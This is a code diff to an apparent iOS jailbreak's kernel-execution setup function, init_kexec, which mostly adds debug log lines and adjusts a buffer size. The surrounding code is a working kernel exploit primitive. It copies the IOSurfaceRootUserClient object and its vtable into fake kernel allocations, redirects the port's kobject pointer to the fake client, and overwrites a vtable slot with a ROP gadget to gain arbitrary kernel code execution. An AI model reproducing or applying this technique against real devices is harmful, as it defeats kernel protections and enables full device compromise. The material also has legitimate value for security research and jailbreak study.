@@ -50,47 +50,51 @@ static const int fake_kalloc_size = 0x1000;
 static pthread_mutex_t kexec_lock;
 
 bool init_kexec() {
+    puts("kexec: preparing user client");
     user_client = prepare_user_client();
     if (!MACH_PORT_VALID(user_client)) {
         return false;
     }
+    puts("kexec: getting user client port address");
     IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client);
     if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) {
         return false;
     }
+    puts("kexec: getting user client port ptr");
     IOSurfaceRootUserClient_addr = kread_uint64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) {
         return false;
     }
-    
+    puts("kexec: getting vtab ptr");
     kptr_t IOSurfaceRootUserClient_vtab = kread_uint64(IOSurfaceRootUserClient_addr);
     if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) {
         return false;
     }
-    
+    puts("kexec: allocating fake vtable");
     fake_vtable = kmem_alloc(fake_kalloc_size);
     if (!KERN_POINTER_VALID(fake_vtable)) {
         return false;
     }
     
-    size_t buffer_size = 0x200 * 8;
-    void *buffer = malloc(0x200 * 8);
-    
+    size_t buffer_size = fake_kalloc_size;
+    void *buffer = malloc(fake_kalloc_size);
+    puts("kexec: copying vtable");
     kread(IOSurfaceRootUserClient_vtab, buffer, buffer_size);
     kwrite(fake_vtable, buffer, buffer_size);
-    
+    puts("kexec: allocating fake client");
     fake_client = kmem_alloc(fake_kalloc_size);
     if (!KERN_POINTER_VALID(fake_client)) {
         return false;
     }
-    
+    puts("kexec: copying fake client");
     kread(IOSurfaceRootUserClient_addr, buffer, buffer_size);
     kwrite(fake_client, buffer, buffer_size);
-    
+    puts("kexec: overwriting user client");
     kwrite_uint64(fake_client, fake_vtable);
     kwrite_uint64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
     
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
+    puts("kexec: setting ROP");
     kwrite_uint64(fake_vtable + 8 * 0xB7, get_add_x0_x0_0x40_ret());
     pthread_mutex_init(&kexec_lock, NULL);
     free(buffer);
